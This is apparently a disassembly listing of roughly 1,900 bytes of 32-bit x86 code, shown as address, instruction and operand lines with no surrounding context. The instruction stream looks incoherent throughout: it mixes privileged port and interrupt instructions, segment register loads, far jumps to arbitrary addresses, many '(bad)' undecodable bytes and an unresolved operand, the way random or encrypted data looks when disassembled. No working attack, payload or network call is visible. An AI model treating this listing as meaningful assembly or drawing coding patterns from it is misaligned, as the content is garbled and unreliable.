  52ab57:	xor    esp,DWORD PTR [edi+0x4a]
  52ab5a:	pop    es
  52ab5b:	or     eax,DWORD PTR [ebx+eax*1-0x26]
  52ab5f:	out    dx,al
  52ab60:	pop    eax
  52ab61:	test   edi,0x47176826
  52ab67:	rcl    BYTE PTR [eax-0x6e],cl
  52ab6a:	and    ebp,DWORD PTR [edi+0x7d]
  52ab6d:	pop    ds
  52ab6e:	xchg   esp,eax
  52ab6f:	mov    al,0x7a
  52ab71:	test   eax,0x179d8430
  52ab76:	cli    
  52ab77:	dec    eax
  52ab78:	sub    DWORD PTR [ebp+0x6c],esi
  52ab7b:	xchg   edi,eax
  52ab7c:	xor    edi,eax
  52ab7e:	leave  
  52ab7f:	sbb    edx,DWORD PTR [eax-0x51]
  52ab82:	in     eax,0x8f
  52ab84:	fidivr WORD PTR [edx]
  52ab86:	aas    
  52ab87:	ins    BYTE PTR es:[edi],dx
  52ab88:	cmc    
  52ab89:	adc    DWORD PTR [esi],0x6c
  52ab8c:	add    al,BYTE PTR [ebp+ecx*2+0x28f30e91]
  52ab93:	pop    ebp
  52ab94:	addr16 adc ch,bh
  52ab97:	retf   0xfdae
  52ab9a:	arpl   ax,sp
  52ab9c:	fnstenv [ecx]
  52ab9e:	ja     0x52abae
  52aba0:	jmp    0x6640:0xd23e3b92
  52aba7:	or     ch,BYTE PTR [edx]
  52aba9:	cmc    
  52abaa:	mov    edx,0xfe52bf75
  52abaf:	es jp  0x52ac0e
  52abb2:	cmp    dh,BYTE PTR es:[esi]
  52abb5:	add    DWORD PTR [eax],0x7956f80e
  52abbb:	and    al,0xfb
  52abbd:	push   0xfe5253ec
  52abc2:	es mov eax,esi
  52abc5:	pop    ecx
  52abc6:	popf   
  52abc7:	pop    ss
  52abc8:	fs cmp al,0x58
  52abcb:	add    eax,0x22a49dd4
  52abd0:	cs in  eax,dx
  52abd2:	iret   
  52abd3:	mov    ss,ebp
  52abd5:	and    ch,BYTE PTR [esi-0x28659391]
  52abdb:	or     esi,DWORD PTR [ebp-0x35]
  52abde:	mov    ebx,0xd5da79e6
  52abe3:	xchg   ebp,eax
  52abe4:	dec    edx
  52abe5:	sti    
  52abe6:	cli    
  52abe7:	jnp    0x52ac4a
  52abe9:	fisub  DWORD PTR [edi-0x3]
  52abec:	les    esi,FWORD PTR [eax+0x20ceb8b5]
  52abf2:	aaa    
  52abf3:	inc    ebp
  52abf4:	mov    edi,?
  52abf6:	lds    ebx,FWORD PTR [edi+0x1a40fc40]
  52abfc:	sbb    bh,al
  52abfe:	push   esp
  52abff:	cmp    ecx,edx
  52ac01:	dec    esi
  52ac02:	jl     0x52ac10
  52ac04:	(bad)  
  52ac05:	ja     0x52ac2e
  52ac07:	cmp    eax,0x13f9c33c
  52ac0c:	(bad)
  52ac0f:	jg     0x52ac7c
  52ac11:	xor    BYTE PTR [edx+eiz*8],al
  52ac14:	jnp    0x52ac5f
  52ac16:	add    DWORD PTR [ebx],esi
  52ac18:	mov    eax,ds:0x330a1740
  52ac1d:	jb     0x52ac4a
  52ac1f:	mul    DWORD PTR [ebx]
  52ac21:	gs sub eax,0x765fa78b
  52ac27:	jp     0x52abb5
  52ac29:	xchg   ebx,eax
  52ac2a:	ret    0xa0d
  52ac2d:	into   
  52ac2e:	popa   
  52ac2f:	fild   QWORD PTR [ebp-0x59]
  52ac32:	retf   0x258b
  52ac35:	fsubr  DWORD PTR [edi+0x2f]
  52ac38:	fidivr WORD PTR [edi-0x18]
  52ac3b:	or     esp,DWORD PTR [ebp+0x6d5a2235]
  52ac41:	jns    0x52ac39
  52ac43:	lahf   
  52ac44:	or     esp,DWORD PTR [esi]
  52ac46:	fdiv   DWORD PTR [edx+0xe]
  52ac49:	iret   
  52ac4a:	inc    ecx
  52ac4b:	push   edx
  52ac4c:	dec    edx
  52ac4d:	push   esi
  52ac4e:	lods   ax,WORD PTR ds:[esi]
  52ac50:	mov    esp,esi
  52ac52:	add    bl,BYTE PTR [ebx+eax*2+0x44]
  52ac56:	inc    edi
  52ac57:	pop    edi
  52ac58:	push   cs
  52ac59:	mov    fs,WORD PTR [ebx]
  52ac5b:	push   eax
  52ac5c:	cmp    eax,0x7964ac84
  52ac61:	xchg   edx,eax
  52ac62:	cld    
  52ac63:	ret    
  52ac64:	and    ebx,DWORD PTR [edi]
  52ac66:	sbb    BYTE PTR [eax+0x3e2d8ab8],bl
  52ac6c:	call   0xd18a79d
  52ac71:	aam    0x17
  52ac73:	add    al,0xf6
  52ac75:	retf   
  52ac76:	inc    edi
  52ac77:	pop    es
  52ac78:	pop    eax
  52ac79:	rcl    edi,1
  52ac7b:	lods   al,BYTE PTR ds:[esi]
  52ac7c:	loopne 0x52ac30
  52ac7e:	sahf   
  52ac7f:	leave  
  52ac80:	pusha  
  52ac81:	inc    ebx
  52ac82:	mov    es,WORD PTR [edx-0x13421bce]
  52ac88:	loop   0x52ac4f
  52ac8a:	psubsb mm0,QWORD PTR [edx+0x64]
  52ac8e:	mov    ecx,0x456fac0f
  52ac93:	stos   BYTE PTR es:[edi],al
  52ac94:	outs   dx,BYTE PTR ds:[esi]
  52ac95:	pop    ecx
  52ac96:	inc    ebp
  52ac97:	outs   dx,BYTE PTR ds:[esi]
  52ac98:	add    ch,dl
  52ac9a:	(bad)  
  52ac9b:	jno    0x52ad0b
  52ac9d:	xchg   edx,eax
  52ac9e:	add    al,0xf1
  52aca0:	fld    DWORD PTR [ecx-0x7c]
  52aca3:	sti    
  52aca4:	and    eax,0x79935c7c
  52aca9:	ss vsqrtsd xmm3,xmm3,xmm5
  52acae:	push   edx
  52acaf:	je     0x52ac96
  52acb1:	retf   
  52acb2:	and    ecx,DWORD PTR [edx]
  52acb4:	dec    ebp
  52acb5:	push   es
  52acb6:	mov    ebx,esp
  52acb8:	mov    ch,0xcc
  52acba:	dec    eax
  52acbb:	out    dx,eax
  52acbc:	sub    edx,DWORD PTR [eax]
  52acbe:	clc    
  52acbf:	sbb    BYTE PTR [esi],bl
  52acc1:	sub    al,BYTE PTR [eax-0x8]
  52acc4:	cwde   
  52acc5:	adc    DWORD PTR [eax],eax
  52acc7:	inc    ecx
  52acc8:	repnz adc BYTE PTR [edx+eiz*2+0x53],cl
  52accd:	(bad)
  52acd2:	enter  0x7abe,0xf9
  52acd6:	mov    ch,0x11
  52acd8:	and    al,0x14
  52acda:	fisttp WORD PTR [edi+0x7090d4ce]
  52ace0:	loop   0x52ad55
  52ace2:	retf   
  52ace3:	out    0x8f,al
  52ace5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52ace6:	pop    edx
  52ace7:	in     eax,dx
  52ace8:	inc    ecx
  52ace9:	jae    0x52ad44
  52aceb:	xor    esp,DWORD PTR [eax+0x3b]
  52acee:	sbb    cl,BYTE PTR [ebx-0x18]
  52acf1:	xchg   ecx,eax
  52acf2:	fs inc ecx
  52acf4:	fadd   DWORD PTR [ecx]
  52acf6:	lahf   
  52acf7:	hlt    
  52acf8:	jl     0x52acce
  52acfa:	pop    edi
  52acfb:	sti    
  52acfc:	jbe    0x52ad25
  52acfe:	(bad)  
  52acff:	adc    cl,bl
  52ad01:	push   cs
  52ad02:	dec    ebp
  52ad03:	out    dx,eax
  52ad04:	lods   eax,DWORD PTR ds:[esi]
  52ad05:	jge    0x52ad0c
  52ad07:	inc    ebx
  52ad08:	fld1   
  52ad0a:	icebp  
  52ad0b:	(bad)  
  52ad0c:	retf   
  52ad0d:	lahf   
  52ad0e:	mov    eax,DWORD PTR [esi-0x338a8834]
  52ad14:	xchg   ebx,eax
  52ad15:	ds loop 0x52ad85
  52ad18:	xchg   esi,eax
  52ad19:	push   ecx
  52ad1a:	lock mov ss,WORD PTR [edi]
  52ad1d:	sbb    cl,al
  52ad1f:	ja     0x52ad1b
  52ad21:	or     DWORD PTR [edx-0x4f6bf27c],ebp
  52ad27:	es pop ecx
  52ad29:	outs   dx,DWORD PTR ds:[esi]
  52ad2a:	std    
  52ad2b:	push   esi
  52ad2c:	adc    esi,ebp
  52ad2e:	sub    bl,BYTE PTR [ebx+edx*2-0x25d77c2f]
  52ad35:	call   DWORD PTR [edx+0x1103d17]
  52ad3b:	adc    BYTE PTR [edi+0x73ef8888],ah
  52ad41:	rcr    DWORD PTR [eax],cl
  52ad43:	aam    0x1d
  52ad45:	adc    ecx,0x41
  52ad48:	rol    DWORD PTR [ecx],cl
  52ad4a:	adc    DWORD PTR [eax+0xe],ebx
  52ad4d:	cwde   
  52ad4e:	es jmp 0x6cc6:0xd1868dbc
  52ad56:	leave  
  52ad57:	push   ecx
  52ad58:	sbb    BYTE PTR [edx-0x28ebbaec],dl
  52ad5e:	imul   BYTE PTR [edi-0x235a447a]
  52ad64:	push   ecx
  52ad65:	xchg   esi,eax
  52ad66:	in     eax,0xd1
  52ad68:	fwait
  52ad69:	add    eax,0x5d343eb8
  52ad6e:	fsubr  st(1),st
  52ad70:	sbb    bh,ch
  52ad72:	sub    BYTE PTR [ecx-0x561282c4],dh
  52ad78:	sub    al,0xd4
  52ad7a:	xor    ebp,DWORD PTR es:[ecx-0x4b]
  52ad7e:	cs jmp 0x981884d8
  52ad84:	cld    
  52ad85:	outs   dx,DWORD PTR ds:[esi]
  52ad86:	repnz ss cld 
  52ad89:	mov    ds:0x55704812,eax
  52ad8e:	pop    edi
  52ad8f:	cmp    bl,BYTE PTR [eax-0x71]
  52ad92:	push   esi
  52ad93:	mov    bh,0x99
  52ad95:	arpl   WORD PTR [edx+0x6e21997c],ax
  52ad9b:	mov    ds:0x2111ba36,eax
  52ada0:	push   esp
  52ada1:	gs test bl,dh
  52ada4:	rol    DWORD PTR [esi+ebx*2],cl
  52ada7:	sub    DWORD PTR [esi-0x1ca11b66],eax
  52adad:	lahf   
  52adae:	lods   al,BYTE PTR ds:[esi]
  52adaf:	fnstsw WORD PTR [edx-0x2ae1f898]
  52adb5:	loope  0x52addd
  52adb7:	lahf   
  52adb8:	daa    
  52adb9:	loopne 0x52ad56
  52adbb:	mov    esi,0xd9536180
  52adc0:	push   eax
  52adc1:	jp     0x52adc8
  52adc3:	adc    al,BYTE PTR [ebp+0x5c]
  52adc6:	cld    
  52adc7:	inc    ecx
  52adc8:	rep stos BYTE PTR es:[edi],al
  52adca:	ret    0x333c
  52adcd:	and    cl,BYTE PTR ds:0x71ae1e61
  52add3:	xor    BYTE PTR [edx-0x3951d91e],al
  52add9:	inc    eax
  52adda:	cmp    cl,BYTE PTR [edi-0x4d]
  52addd:	loope  0x52ad9c
  52addf:	das    
  52ade0:	and    ecx,ebx
  52ade2:	jp     0x52ad85
  52ade4:	mov    al,0x44
  52ade6:	xchg   ebp,eax
  52ade7:	outs   dx,DWORD PTR ds:[esi]
  52ade8:	pop    esp
  52ade9:	pop    ds
  52adea:	pop    eax
  52adeb:	arpl   WORD PTR [edi+ebp*8+0x2],bp
  52adef:	rol    ch,0x58
  52adf2:	xlat   BYTE PTR ds:[ebx]
  52adf3:	adc    eax,0x73435e8f
  52adf8:	ror    ch,1
  52adfa:	daa    
  52adfb:	into   
  52adfc:	jmp    0xf2d427e8
  52ae01:	mov    bl,BYTE PTR [ecx+0xa]
  52ae04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52ae05:	inc    edi
  52ae06:	sbb    DWORD PTR [ebx],ebp
  52ae08:	mov    bl,0x54
  52ae0a:	and    eax,0x7cff4e9b
  52ae0f:	in     al,0x5a
  52ae11:	mov    ss,WORD PTR [edi+0x2ce311e]
  52ae17:	add    eax,ebp
  52ae19:	and    eax,0xffbb706b
  52ae1e:	pop    edi
  52ae1f:	call   0x91a6b213
  52ae24:	cmp    ebx,DWORD PTR [ebp+0xe]
  52ae27:	inc    edx
  52ae28:	imul   BYTE PTR [ebx-0x75]
  52ae2b:	jmp    0xbdb8f559
  52ae30:	(bad)  
  52ae31:	pop    ecx
  52ae32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52ae33:	xor    ah,BYTE PTR [ecx]
  52ae35:	or     BYTE PTR [esi-0x5a3ec88b],ch
  52ae3b:	(bad)  
  52ae3c:	in     eax,0xf2
  52ae3e:	xchg   esi,eax
  52ae3f:	xor    ebp,ebp
  52ae41:	int3   
  52ae42:	jo     0x52ae72
  52ae44:	in     eax,0xd5
  52ae46:	shl    BYTE PTR [edx+ebp*4+0x45ca1a50],cl
  52ae4d:	fsubr  DWORD PTR [edx]
  52ae4f:	xor    BYTE PTR [edx+0x10ed8fbf],cl
  52ae55:	(bad)  
  52ae56:	sbb    esi,DWORD PTR [ebx]
  52ae58:	or     BYTE PTR [ebp+0x4],bl
  52ae5b:	test   DWORD PTR [esp+eiz*8+0x69],0x66e24a21
  52ae63:	div    al
  52ae65:	sahf   
  52ae66:	or     al,0x8a
  52ae68:	add    eax,0x5b51d05a
  52ae6d:	jp     0x52ae50
  52ae6f:	mov    dl,0x2b
  52ae71:	add    ebp,DWORD PTR [ecx*4-0x766ba5ab]
  52ae78:	sbb    DWORD PTR [ebx+0x55f204aa],esi
  52ae7e:	nop
  52ae7f:	xchg   edi,eax
  52ae80:	add    eax,0x349980f3
  52ae85:	js     0x52ae95
  52ae87:	mov    cs,WORD PTR [ebx-0x29]
  52ae8a:	sahf   
  52ae8b:	es aad 0x7a
  52ae8e:	cmp    eax,0x7b6eeda2
  52ae93:	lock mov ebx,0x368116c9
  52ae99:	xchg   ebp,eax
  52ae9a:	ins    DWORD PTR es:[edi],dx
  52ae9b:	xchg   ebx,eax
  52ae9c:	push   esp
  52ae9d:	call   0x5859:0x22a74f79
  52aea4:	ror    DWORD PTR [eax-0x7024beaf],0xdc
  52aeab:	test   BYTE PTR [eax+esi*8],0x22
  52aeaf:	out    0xd0,al
  52aeb1:	mov    dl,0xb
  52aeb3:	add    al,0x7e
  52aeb5:	call   FWORD PTR [esi+0x2b091bc9]
  52aebb:	cmp    al,0x9c
  52aebd:	sub    DWORD PTR [edi+0x7b],0x2af3256
  52aec4:	or     al,0xb0
  52aec6:	xlat   BYTE PTR ds:[ebx]
  52aec7:	jge    0x52aed7
  52aec9:	push   0xffffffb6
  52aecb:	scas   al,BYTE PTR es:[edi]
  52aecc:	sbb    DWORD PTR [eax+0x1e22c2f6],esp
  52aed2:	retf   0x39ab
  52aed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52aed6:	mov    bl,0x1e
  52aed8:	cmp    BYTE PTR [esi],ah
  52aeda:	fimul  WORD PTR [eax]
  52aedc:	cwde   
  52aedd:	ins    BYTE PTR es:[edi],dx
  52aede:	retf   
  52aedf:	xchg   ebx,eax
  52aee0:	ins    DWORD PTR es:[edi],dx
  52aee1:	rcl    BYTE PTR [ebp+0x3b],0x67
  52aee5:	les    ebp,FWORD PTR [ecx-0x78a2eaf7]
  52aeeb:	xor    DWORD PTR [esi-0x466e7ae4],edi
  52aef1:	add    dl,bh
  52aef3:	add    eax,0xc51477a3
  52aef8:	dec    eax
  52aef9:	add    al,0xf3
  52aefb:	loope  0x52aee3
  52aefd:	ja     0x52ae8d
  52aeff:	mov    ah,0xc7
  52af01:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  52af03:	mov    dl,0xe7
  52af05:	dec    ecx
  52af06:	into   
  52af07:	mov    ch,0xb0
  52af09:	adc    BYTE PTR [edi+0x30],ah
  52af0c:	sub    edx,DWORD PTR [esi+0x54]
  52af0f:	dec    ebx
  52af10:	rol    BYTE PTR [edi-0x75],1
  52af13:	iret   
  52af14:	lods   eax,DWORD PTR ds:[esi]
  52af15:	pop    ds
  52af16:	mov    esi,0xe062a1dc
  52af1b:	jns    0x52af3c
  52af1d:	scas   al,BYTE PTR es:[edi]
  52af1e:	aam    0xdf
  52af20:	push   eax
  52af21:	push   edx
  52af22:	cmp    eax,0x36799453
  52af27:	sahf   
  52af28:	fisttp QWORD PTR [edx+0x67]
  52af2b:	pop    es
  52af2c:	pushf  
  52af2d:	jb     0x52af03
  52af2f:	xor    DWORD PTR [edx-0x33],esi
  52af32:	bound  edi,QWORD PTR [eax+0x119d98ca]
  52af38:	sub    al,0x7d
  52af3a:	int    0x87
  52af3c:	mov    WORD PTR [ebx],es
  52af3e:	mov    dl,0xc2
  52af40:	jle    0x52af72
  52af42:	fcom   DWORD PTR [ebp+0x42fcc15a]
  52af48:	in     eax,dx
  52af49:	push   es
  52af4a:	lods   eax,DWORD PTR ds:[esi]
  52af4b:	mov    esp,0x7481d997
  52af50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52af51:	imul   ebp,edx,0xf0797d89
  52af57:	inc    ebp
  52af58:	mov    edi,esi
  52af5a:	push   eax
  52af5b:	mov    ebp,eax
  52af5d:	cs retf 0xb1e4
  52af61:	mov    edi,0xe1505f6d
  52af66:	and    al,0xc4
  52af68:	sub    BYTE PTR [eax+0x305059a1],cl
  52af6e:	add    DWORD PTR [edi],esp
  52af70:	test   eax,0x2b0c1daf
  52af75:	xchg   edi,eax
  52af76:	jo     0x52af96
  52af78:	add    eax,0x16891e82
  52af7d:	loope  0x52af91
  52af7f:	jne    0x52af08
  52af81:	das    
  52af82:	cdq    
  52af83:	pop    ecx
  52af84:	adc    ebx,ebp
  52af86:	or     eax,0x6aeed141
  52af8b:	call   0xc3b7b6e6
  52af90:	xor    eax,0x4428f913
  52af95:	add    ebx,DWORD PTR [ebx+edi*8-0x50e1a59e]
  52af9c:	in     al,0xb7
  52af9e:	jl     0x52afff
  52afa0:	fadd   DWORD PTR [eax]
  52afa2:	hlt    
  52afa3:	add    dh,bl
  52afa5:	inc    eax
  52afa6:	sbb    DWORD PTR [edi-0x20ec5b79],eax
  52afac:	cli    
  52afad:	fs test al,0x1f
  52afb0:	mov    dl,BYTE PTR [ebx+0x4214187d]
  52afb6:	and    DWORD PTR [esi+edx*1],edi
  52afb9:	cmp    eax,0xeff8d391
  52afbf:	add    eax,eax
  52afc1:	dec    esp
  52afc2:	or     cl,BYTE PTR [ecx]
  52afc4:	pusha  
  52afc5:	pushf  
  52afc6:	add    bh,bh
  52afc8:	nop
  52afc9:	mov    bl,0x94
  52afcb:	mov    eax,0x2d1915ed
  52afd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52afd1:	push   ecx
  52afd2:	sbb    ecx,edx
  52afd4:	scas   eax,DWORD PTR es:[edi]
  52afd5:	ret    
  52afd6:	lea    edx,[ebx+ebp*1-0x1bf6ee8e]
  52afdd:	sbb    DWORD PTR [esi-0x5a],edi
  52afe0:	icebp  
  52afe1:	aam    0xe5
  52afe3:	out    0xb9,eax
  52afe5:	xchg   ebx,eax
  52afe6:	iret   
  52afe7:	mov    ebp,0xdcd6d96c
  52afec:	xchg   edi,eax
  52afed:	jmp    0x52afc0
  52afef:	mov    al,0xd3
  52aff1:	inc    edi
  52aff2:	inc    edx
  52aff3:	lea    ebp,[ecx-0x5f]
  52aff6:	push   ss
  52aff7:	mov    ch,0xe9
  52aff9:	cs and al,0xee
  52affc:	loop   0x52afea
  52affe:	xchg   ebp,eax
  52afff:	push   ebp
  52b000:	mov    esi,0xed5b77ee
  52b005:	cmp    eax,0x4c29dc09
  52b00a:	(bad)  
  52b00b:	(bad)  
  52b00c:	fidivr WORD PTR [esi-0x346c6c4c]
  52b012:	into   
  52b013:	jl     0x52af95
  52b015:	jb     0x52afcf
  52b017:	add    BYTE PTR [ebp+0x4f4895a6],bh
  52b01d:	mov    bh,0x2e
  52b01f:	and    ebx,eax
  52b021:	out    dx,eax
  52b022:	mov    edi,0x1b4b428
  52b027:	out    0xd5,eax
  52b029:	cmp    bl,BYTE PTR [eax-0x603e8250]
  52b02f:	dec    esi
  52b030:	xor    BYTE PTR [ebx+0x6d],bh
  52b033:	mov    ecx,0x8983116
  52b038:	and    al,dh
  52b03a:	out    0xd,eax
  52b03c:	sti    
  52b03d:	or     BYTE PTR [ebx-0x53ed0d01],ch
  52b043:	mov    ds:0x139e50be,al
  52b048:	test   DWORD PTR [esi-0x73bf250c],0x60d0a6d0
  52b052:	pushf  
  52b053:	xchg   esp,eax
  52b054:	int    0x41
  52b056:	jo     0x52b009
  52b058:	mov    esp,0xfcbc316
  52b05d:	adc    DWORD PTR [ebp-0x7e],ebp
  52b060:	jle    0x52afec
  52b062:	inc    esp
  52b063:	push   esi
  52b064:	ret    
  52b065:	out    0xb4,eax
  52b067:	jmp    0x17d6a76b
  52b06c:	mov    edx,DWORD PTR [ebp-0x3e]
  52b06f:	dec    esi
  52b070:	js     0x52b09c
  52b072:	jae    0x52b032
  52b074:	test   eax,0xa6de109b
  52b079:	pop    ss
  52b07a:	fdivr  QWORD PTR [ebp+0xf22126e]
  52b080:	mov    al,ds:0x438a2a80
  52b085:	(bad)  
  52b086:	(bad)  
  52b087:	hlt    
  52b088:	add    eax,0xf1e1ffd1
  52b08d:	sub    al,0xd9
  52b08f:	sbb    al,0xc9
  52b091:	jae    0x52b03d
  52b093:	xchg   esi,eax
  52b094:	lock xor eax,0x7802fc3e
  52b09a:	inc    esi
  52b09b:	mov    eax,ds:0xf1b64ed4
  52b0a0:	jns    0x52b06d
  52b0a2:	inc    eax
  52b0a3:	mov    ebp,0x27781ad8
  52b0a8:	addr16 retf 
  52b0aa:	jmp    0xb08f:0xa8e1f357
  52b0b1:	cli    
  52b0b2:	push   cs
  52b0b3:	or     al,BYTE PTR [eax]
  52b0b5:	xchg   ebp,eax
  52b0b6:	out    0xa9,al
  52b0b8:	ret    
  52b0b9:	xor    edx,DWORD PTR [ecx-0xd]
  52b0bc:	mov    gs,ecx
  52b0be:	cmp    al,0x92
  52b0c0:	rcl    BYTE PTR [edx],1
  52b0c2:	hlt    
  52b0c3:	mov    DWORD PTR [esi],ebx
  52b0c5:	rcl    BYTE PTR [edi-0x124df04a],0x12
  52b0cc:	mul    ebx
  52b0ce:	mov    ah,0x67
  52b0d0:	(bad)  
  52b0d1:	aaa    
  52b0d2:	les    edi,FWORD PTR [ecx]
  52b0d4:	xchg   ebp,eax
  52b0d5:	lods   al,BYTE PTR ds:[esi]
  52b0d6:	rcr    edx,cl
  52b0d8:	sti    
  52b0d9:	xchg   edx,eax
  52b0da:	pushf  
  52b0db:	data16 outs dx,BYTE PTR ds:[esi]
  52b0dd:	les    edx,FWORD PTR [edx+0x281f0469]
  52b0e3:	sub    esi,DWORD PTR [ebp+0x148acdd9]
  52b0e9:	sahf   
  52b0ea:	mov    BYTE PTR [ebx+0x50ec0706],al
  52b0f0:	sbb    DWORD PTR [eax],ebx
  52b0f2:	and    ebx,ebp
  52b0f4:	mov    ch,0x7f
  52b0f6:	(bad)  
  52b0f7:	mov    ds:0xdaed66c6,al
  52b0fc:	push   esp
  52b0fd:	sub    eax,0xb8fd15d
  52b102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52b103:	fist   WORD PTR [esi]
  52b105:	mov    DWORD PTR [edx],ebx
  52b107:	jg     0x52b0b5
  52b109:	fwait
  52b10a:	cmp    DWORD PTR [edx+0x5994e27b],ecx
  52b110:	pop    esp
  52b111:	cs dec esp
  52b113:	addr16 dec edi
  52b115:	out    0xbb,al
  52b117:	jp     0x52b0c0
  52b119:	(bad)  [esi+ebp*4]
  52b11c:	jl     0x52b17c
  52b11e:	std    
  52b11f:	and    DWORD PTR [eax],0xffffff98
  52b122:	pop    ebp
  52b123:	or     eax,0x577c6b6f
  52b128:	cli    
  52b129:	mov    al,ds:0x5bd0cea
  52b12e:	inc    ecx
  52b12f:	pop    esi
  52b130:	cmp    dh,BYTE PTR [esi]
  52b132:	push   ecx
  52b133:	or     BYTE PTR [ebx-0x605121c4],0x7a
  52b13a:	shl    DWORD PTR [ebx+0x49f8fb8d],0x68
  52b141:	pop    ds
  52b142:	cmp    al,0xa7
  52b144:	push   edx
  52b145:	cmc    
  52b146:	mov    bl,0x15
  52b148:	or     eax,0x6e40b38c
  52b14d:	sbb    edx,DWORD PTR [edx]
  52b14f:	and    al,0x85
  52b151:	retf   0x1235
  52b154:	shl    eax,0x18
  52b157:	icebp  
  52b158:	sets   BYTE PTR [esi+edx*4+0x2b4566c7]
  52b160:	mov    dh,0x36
  52b162:	adc    BYTE PTR [esi-0x8],bl
  52b165:	sar    DWORD PTR [edi],0x48
  52b168:	add    DWORD PTR [ecx],ebp
  52b16a:	push   0xbedbcfcf
  52b16f:	mov    edi,0xead27f77
  52b174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52b175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52b176:	ins    DWORD PTR es:[edi],dx
  52b177:	popf   
  52b178:	sbb    DWORD PTR [esi-0x771eb253],esi
  52b17e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52b17f:	fucom  st(6)
  52b181:	jle    0x52b19b
  52b183:	xchg   ebp,eax
  52b184:	hlt    
  52b185:	sub    DWORD PTR [edi+edi*2],edi
  52b188:	imul   esp,DWORD PTR [edx],0x66
  52b18b:	loop   0x52b163
  52b18d:	outs   dx,BYTE PTR ds:[esi]
  52b18e:	lods   al,BYTE PTR ds:[esi]
  52b18f:	lods   eax,DWORD PTR ds:[esi]
  52b190:	xor    eax,0x9040e95
  52b195:	in     al,dx
  52b196:	lahf   
  52b197:	aam    0xc5
  52b199:	jmp    0xf0a48019
  52b19e:	out    dx,eax
  52b19f:	xor    ecx,DWORD PTR [ecx-0x20d193a9]
  52b1a5:	es cmp eax,0x9eb9e698
  52b1ab:	js     0x52b19d
  52b1ad:	jp     0x52b1cd
  52b1af:	sbb    ah,BYTE PTR [ebp-0x48]
  52b1b2:	fstp   TBYTE PTR [ecx-0x3ec8b6cc]
  52b1b8:	fstp   TBYTE PTR [edi-0x5a]
  52b1bb:	jno    0x52b20e
  52b1bd:	sar    BYTE PTR [eax+0x21],0x46
  52b1c1:	psraw  mm6,QWORD PTR [ecx-0x5443f518]
  52b1c8:	push   edx
  52b1c9:	psubsb mm0,QWORD PTR [esi]
  52b1cc:	sti    
  52b1cd:	daa    
  52b1ce:	nop
  52b1cf:	shl    BYTE PTR [ebp+0x36],1
  52b1d2:	ret    
  52b1d3:	pop    edx
  52b1d4:	fiadd  WORD PTR [eax]
  52b1d6:	xchg   BYTE PTR ds:0x141393b1,dl
  52b1dc:	lds    esi,FWORD PTR [edi]
  52b1de:	ror    DWORD PTR [edi+0x25],1
  52b1e1:	adc    al,0x5b
  52b1e3:	test   al,0x17
  52b1e5:	pusha  
  52b1e6:	pop    ss
  52b1e7:	sbb    eax,0xd381bf62
  52b1ec:	in     al,dx
  52b1ed:	dec    ebp
  52b1ee:	inc    ebx
  52b1ef:	xor    al,0xcc
  52b1f1:	fwait
  52b1f2:	push   cs
  52b1f3:	outs   dx,BYTE PTR ds:[esi]
  52b1f4:	fwait
  52b1f5:	test   eax,0x4e122b8f
  52b1fa:	push   ss
  52b1fb:	xchg   esp,eax
  52b1fc:	xchg   edx,eax
  52b1fd:	fisttp WORD PTR [edx+eiz*4-0x5351bed5]
  52b204:	cmp    BYTE PTR [esi-0x15],ah
  52b207:	inc    esi
  52b208:	ins    DWORD PTR es:[edi],dx
  52b209:	iret   
  52b20a:	adc    ah,BYTE PTR [ecx-0x6a]
  52b20d:	neg    BYTE PTR [eax+ebp*4]
  52b210:	sbb    esp,DWORD PTR [edx]
  52b212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52b213:	fnstcw WORD PTR [ebp+0x4a604181]
  52b219:	enter  0xa74a,0xc4
  52b21d:	shl    BYTE PTR [ecx-0x64],1
  52b220:	inc    ecx
  52b221:	data16 je 0x52b233
  52b224:	mov    al,0xa6
  52b226:	stos   BYTE PTR es:[edi],al
  52b227:	or     eax,0xa6ae47f2
  52b22c:	aad    0xa9
  52b22e:	xor    eax,0x9a533a6e
  52b233:	ss fxtract 
  52b236:	fstp   st(5)
  52b238:	les    edi,FWORD PTR [esi]
  52b23a:	lds    edx,FWORD PTR [ebx-0x487091d9]
  52b240:	clc    
  52b241:	add    BYTE PTR [esi-0x80],dl
  52b244:	aas    
  52b245:	out    0xb6,al
  52b247:	lods   eax,DWORD PTR ds:[esi]
  52b248:	ror    BYTE PTR [esi+0x691d1402],1
  52b24e:	outs   dx,DWORD PTR ds:[esi]
  52b24f:	nop
  52b250:	add    eax,edx
  52b252:	xchg   ecx,eax
  52b254:	pop    ecx
  52b255:	fabs   
  52b257:	(bad)  
  52b258:	scas   eax,DWORD PTR es:[edi]
  52b259:	fcom   QWORD PTR [ecx-0x1d]
  52b25c:	cmp    esi,DWORD PTR [eax+0x5135ce19]
  52b262:	call   0x50951ab6
  52b267:	dec    ebx
  52b268:	mov    cx,0x6c7b
  52b26c:	leave  
  52b26d:	mov    edx,0xca40afb
  52b272:	dec    edi
  52b273:	add    eax,0xfffffff0
  52b276:	fsubrp st(4),st
  52b278:	outs   dx,DWORD PTR ds:[esi]
  52b279:	dec    ebx
  52b27a:	jno    0x52b284
  52b27c:	push   edx
  52b27d:	add    al,0x7b
  52b27f:	and    DWORD PTR [ebx-0x6830c6dd],edi
  52b285:	in     al,0xa8
  52b287:	jmp    0x52b308
  52b289:	xor    ah,ah
  52b28b:	add    al,0xbe
  52b28d:	jecxz  0x52b2c8
  52b28f:	call   0x3d46:0xafbeef80
  52b296:	xchg   edi,eax
  52b297:	out    0x8e,eax
  52b299:	nop
  52b29a:	cmp    ebp,DWORD PTR [eax]
  52b29c:	ret    
  52b29d:	and    eax,0xa1c863be
  52b2a2:	inc    esi
  52b2a3:	xchg   esi,eax
  52b2a4:	mov    cl,0xd4
  52b2a6:	mov    DWORD PTR gs:[edx-0x7f3597f2],esi
  52b2ad:	mov    eax,0xa4eb09c3
  52b2b2:	in     eax,0xf0
  52b2b4:	ds push ds
  52b2b6:	test   eax,0x78e441c7
